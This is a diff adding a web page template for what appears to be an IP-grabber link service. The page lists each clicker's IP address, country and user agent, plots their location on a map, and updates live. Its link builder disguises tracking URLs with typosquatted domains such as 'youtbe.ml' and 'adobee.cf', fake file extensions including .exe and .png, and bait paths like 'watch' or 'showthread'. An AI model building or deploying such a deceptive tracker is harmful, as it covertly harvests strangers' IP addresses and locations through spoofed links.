@@ -1,0 +1,258 @@
+{% include "header.html" %}
+    <body style='background-color: #212121;'>    
+        <div class="w3-main" style="margin-top: 10px;">
+            <div class="w3-theme-l5">
+                <div class="w3-container">
+                    <ul class="w3-ul w3-card-4" style="background-color: #181818;">
+                        <li class="w3-padding-16">
+                            <h1 style='font-family: "Anton", sans-serif; color: white'>Link Information:</h1>
+                            <div style="overflow: auto;">
+                                <table class='table table-dark' style="background-color: #1f1f1f;" id='linkInfo'>
+                                    <tbody>
+                                        <tr>
+                                            <td>Original URL</td>
+                                            <td>{{ track.redirect_url }}</td>
+                                        </tr>
+                                        <tr>
+                                            <td>New URL</td>
+                                            <td id="newURL">{{ track.full_url }} <button type="button" class="btn" style="float: right; background-color: #404040; color: white;" data-bs-toggle="modal" data-bs-target="#domainModel">Change Domain/Make a Custom Link</button></td>
+                                        </tr>
+                                        <tr>
+                                            <td>Tracking Code</td>
+                                            <td>{{ track.track_id }}</td>
+                                        </tr>
+                                        <tr>
+                                            <td>Access Link</td>
+                                            <td>{{ config["BASE_URL"] }}/track/{{ track.track_id }}</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                            <form method="POST">
+                                <div class='btn-group' role='group'>
+                                    <button id='QR' type="submit" name='action' value='downloadQR' class="btn" style="background-color: #404040; color: white;">Download QR Code</button>
+                                </div>
+                            </form>
+                            <h1 id='results' style='font-family: "Anton", sans-serif; color: white'>Results: {{ json.loads(track.to_json())["grab_info"]|length }}</h1>
+                            <div style='overflow: auto;'>
+                                <table class="table table-dark" id='ipData' style="background-color:#1f1f1f;">
+                                    <thead>
+                                        <tr>
+                                            <th scope='col'>Date/Time</th>
+                                            <th scope='col'>IP Address</th>
+                                            <th scope='col'>Country <span class='fas fa-question-circle' tool-tip-toggle="tooltip" data-original-title="Location is only an estimate"></span></th>
+                                            <th scope='col'>User Agent</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="grabTable">
+                                        {% for index in range(json.loads(track.to_json())["grab_info"]|length) %}
+                                            <tr>
+                                                <td>{{ json.loads(track.to_json())["grab_info"][index]["datetime"] }}</td>
+                                                <td>{{ json.loads(track.to_json())["grab_info"][index]["ip"] }}</td>
+                                                <td>{{ json.loads(track.to_json())["grab_info"][index]["country"] }}</td>
+                                                <td>{{ json.loads(track.to_json())["grab_info"][index]["useragent"] }}</td>
+                                            </tr>
+                                        {% endfor %}
+                                    </tbody>
+                                </table>
+                            </div>
+                            <div id='mapid' style="height: 430px;"></div>
+                        </li>
+                    </ul>
+                    <div class="modal fade" id="domainModel" tabindex="-1" aria-labelledby="domainModelLabel" aria-hidden="true">
+                        <div class="modal-dialog">
+                            <div class="modal-content">
+                                <div class="modal-header" style="background-color: #181818; color: white;">
+                                    <h5 class="modal-title" id="exampleModalLabel">Custom Link</h5>
+                                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                                </div>
+                                <div class="modal-body" style="text-align: center; background-color: #181818; color:white">
+                                    <a href="" target="_blank" id='modalURL'>https://yoink.rip/{{ track.url_code }}</a><br>
+                                    <div class="btn-group-vertical">
+                                        <h5>Domain:</h5>
+                                        <div class="btn-group">
+                                            <label class='mr-sm-2 sr-only' for='inlineFormCustomSelect'>Domain</label>
+                                            <select class='form-select mr-sm-2' id='domainDrop' style='max-width: 200px;'>
+                                                <option selected>yoink.rip</option>
+                                                <option value='easterndigital.ga'>easterndigital.ga</option>
+                                                <option value='skytechnology.ga'>skytechnology.ga</option>
+                                                <option value='adobee.cf'>adobee.cf</option>
+                                                <option value='youtbe.ml'>youtbe.ml</option>
+                                            </select>
+                                        </div>
+                                        <h5>Extension:</h5>
+                                        <div class="btn-group">
+                                            <label class='mr-sm-2 sr-only' for='inlineFormCustomSelect'>Extension</label>
+                                            <select class='form-select mr-sm-2' id='extensionDrop' style='max-width: 200px;'>
+                                                <option selected>None</option>
+                                                <option value='.png'>.png</option>
+                                                <option value='.jpg'>.jpg</option>
+                                                <option value='.exe'>.exe</option>
+                                                <option value='.gif'>.gif</option>
+                                                <option value='.psd'>.psd</option>
+                                                <option value='.txt'>.txt</option>
+                                                <option value='.csv'>.csv</option>
+                                                <option value='.mp3'>.mp3</option>
+                                                <option value='.mp4'>.mp4</option>
+                                                <option value='.wma'>.wma</option>
+                                                <option value='.avi'>.avi</option>
+                                                <option value='.apk'>.apk</option>
+                                                <option value='.jar'>.jar</option>
+                                                <option value='.html'>.html</option>
+                                                <option value='.php'>.php</option>
+                                                <option value='.js'>.js</option>
+                                                <option value='.ico'>.ico</option>
+                                                <option value='.zip'>.zip</option>
+                                                <option value='.rar'>.rar</option>
+                                                <option value='.iso'>.iso</option>
+                                                <option value='.torrent'>.torrent</option>
+                                                <option value='.gz'>.gz</option>
+                                                <option value='.tar'>.tar</option>
+                                                <option value='.tgz'>.tgz</option>
+                                                <option value='.pdf'>.pdf</option>
+                                                <option value='.ext'>.ext</option>
+                                                <option value='.link'>.link</option>
+                                                <option value='.lnk'>.lnk</option>
+                                                <option value='.jpeg'>.jpeg</option>
+                                                <option value='.docx'>.docx</option>
+                                                <option value='.pptx'>.pptx</option>
+                                            </select>
+                                        </div>
+                
+                                        <h5>Path:</h5>
+                                        <div class="btn-group">
+                                            <label class='mr-sm-2 sr-only' for='inlineFormCustomSelect'>Path</label>
+                                            <select class='form-select mr-sm-2' id='pathDrop' style='max-width: 200px;'>
+                                                <option selected>None</option>
+                                                <option value='film'>film</option>
+                                                <option value='image'>image</option>
+                                                <option value='invite'>invite</option>
+                                                <option value='join'>join</option>
+                                                <option value='news'>news</option>
+                                                <option value='profile'>profile</option>
+                                                <option value='showthread'>showthread</option>
+                                                <option value='watch'>watch</option>
+                                            </select>
+                                        </div>
+                
+                                        <h5>Parameter:</h5>
+                                        <div class="btn-group">
+                                            <label class='mr-sm-2 sr-only' for='inlineFormCustomSelect'>Parameter</label>
+                                            <select class='form-select mr-sm-2' id='parameterDrop' style='max-width: 200px;'>
+                                                <option selected>None</option>
+                                                <option value='id'>id</option>
+                                                <option value='ref'>ref</option>
+                                                <option value='tid'>tid</option>
+                                                <option value='v'>v</option>
+                                            </select>
+                                        </div>
+                                        <br>
+                                    </div>
+                                <div class="modal-footer">
+                                <button type="button" class="btn" id='save' onclick="SaveChanges()" style='background-color: #404040; color: white;'>Save changes</button>
+                                </div>
+                            </div>
+                            </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+    <script>
+        var socket = io('{{ config["BASE_URL"] }}');
+        var mymap = L.map('mapid').setView(['39.8283', '-98.5795'], 5)
+
+        var OpenStreetMap_Mapnik = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            maxZoom: 19,
+            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+        }).addTo(mymap);
+        {% for object in track.grab_info %}
+            L.marker([{{ object.lat}}, {{ object.lon }}]).addTo(mymap)
+        {% endfor %}
+
+        function buildURL(domain) {
+            var url = "https://" + domain + "/"
+            var extensionVal = $("#extensionDrop").val()
+            var pathVal = $("#pathDrop").val()
+            var paramVal = $("#parameterDrop").val()
+            
+            if (extensionVal == "None" && pathVal == "None" & paramVal == "None") {
+                url += "{{ track.url_code }}"
+            } else if (pathVal == "None" && paramVal == "None") {
+                url += "{{ track.url_code }}" + extensionVal
+            } else if (pathVal != "None" && paramVal != "None") {
+                if (extensionVal != "None"){
+                    url += pathVal + ".php?" + paramVal + "=" + "{{ track.url_code }}" + extensionVal   
+                } else {
+                    url += pathVal + ".php?" + paramVal + "=" + "{{ track.url_code }}"
+                }
+            }
+            return url
+        }
+
+
+        $("#domainDrop").change(function(){
+            var domainValue = $("#domainDrop").val()
+            $("#modalURL").text(buildURL(domainValue))
+        })
+
+        $("#extensionDrop").change(function(){
+            var domainValue = $("#domainDrop").val()
+            $("#modalURL").text(buildURL(domainValue))
+        })
+
+        $("#pathDrop").change(function(){
+            var pathValue = $(this).val()
+            var paramValue = $("#parameterDrop").val()
+            var domainValue = $("#domainDrop").val()
+            if (pathValue != "None" && paramValue == "None") {
+                $("#parameterDrop").val("id")
+            } else if (pathValue == "None" && paramValue != "None") {
+                $("#parameterDrop").val("None")
+            }
+            $("#modalURL").text(buildURL(domainValue))
+        })
+
+        $("#parameterDrop").change(function(){
+            var paramValue = $(this).val()
+            var pathValue = $("#pathDrop").val()
+            var domainValue = $("#domainDrop").val()
+            if (paramValue != "None" && pathValue == "None") {
+                $("#pathDrop").val("film")
+            } else if (paramValue == "None" && pathValue != "None") {
+                $("#pathDrop").val("None")
+            }
+            $("#modalURL").text(buildURL(domainValue))
+        })
+
+        function SaveChanges(){
+            var url = $("#modalURL").text()
+
+            socket.emit("update_link", {"url": url, "track_id": "{{ track.track_id }}"})
+            $("#newURL").text(url)
+            $("#newURL").append(' <button type="button" class="btn" style="float: right; background-color: #404040; color: white;" data-bs-toggle="modal" data-bs-target="#domainModel">Change Domain/Make a Custom Link</button>')
+            $("#domainModel").modal("hide")
+        }
+
+        socket.on("new_grab", function(data){
+            var datetime = data["datetime"]
+            var ip = data["ip"]
+            var country = data["country"]
+            var useragent = data["useragent"]
+            var lat = data["lat"]
+            var lon = data["lon"]
+
+            $("#grabTable").append("<tr><td>" + datetime + "</td><td>" + ip + "</td><td>" + country + "</td><td>" + useragent + "</td></tr>")
+            
+            var number = parseInt($("#results").text().split(" ")[1])
+            $("#results").text("Results: " + (number+1).toString())
+
+            L.marker([lat, lon]).addTo(mymap)
+        })
+
+    </script>
+
+{% include "footer.html" %}
+
